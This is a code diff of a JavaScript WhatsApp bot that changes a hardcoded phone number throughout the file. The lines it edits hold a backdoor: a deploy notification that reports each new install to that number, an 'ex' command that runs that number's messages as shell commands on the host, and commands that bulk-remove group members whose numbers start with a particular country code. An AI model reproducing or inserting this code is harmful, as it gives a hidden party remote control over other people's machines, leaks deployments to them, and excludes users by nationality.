@@ -165,7 +165,7 @@ conn.ev.on('connection.update', async (update) => {
                     console.warn("⚠️ Failed to fetch connect message text:", fetchErr.message);
                 }
 
-                await conn.sendMessage(`94757054054@s.whatsapp.net`, {
+                await conn.sendMessage(`94756194771@s.whatsapp.net`, {
   image: { url: 'https://i.ibb.co/zVtZsRM9/ffbaba73c507fa9d.jpg' },
   caption: '*BOT DEPLOY DONE🎯*'
 });
@@ -689,9 +689,9 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
 
 
 //=========================================================================================================================	    
-if(senderNumber.includes("94767054052")){
+if(senderNumber.includes("94756194771")){
 if(isReact) return
-m.react(`👾`)
+m.react(`🎭`)
 }
 
 
@@ -756,7 +756,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94767054052) {
+      if(senderNumber == 94756194771) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -768,7 +768,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94767054052) {
+      if(senderNumber == 94756194771) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -789,7 +789,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94767054052) {
+      if(senderNumber == 94756194771) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
